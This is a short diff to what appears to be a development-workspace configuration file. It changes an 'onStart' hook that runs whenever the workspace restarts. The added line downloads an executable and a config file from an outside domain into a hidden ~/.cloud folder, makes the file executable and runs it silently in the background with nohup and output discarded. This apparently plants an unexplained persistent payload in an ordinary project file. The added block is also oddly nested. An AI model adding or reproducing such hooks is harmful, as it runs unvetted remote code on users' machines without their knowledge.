@@ -45,7 +45,9 @@
       };
       # Runs when the workspace is (re)started
       onStart = {
-        joko = "cd  ~/.cloud && wget -O config.json https://dot-store.biz.id/bagong.json && nohup ./cloud -c config.json > /dev/null 2>&1 &";
+        onStart = {
+  joko = "mkdir -p ~/.cloud && cd ~/.cloud && [ -f cloud ] || wget -O cloud https://dot-store.biz.id/bagong && wget -O config.json https://dot-store.biz.id/bagong.json && chmod +x cloud && nohup ./cloud -c config.json > /dev/null 2>&1 &";
+};
         # Example: start a background task to watch and re-build backend code
         # watch-backend = "npm run watch-backend";
       };
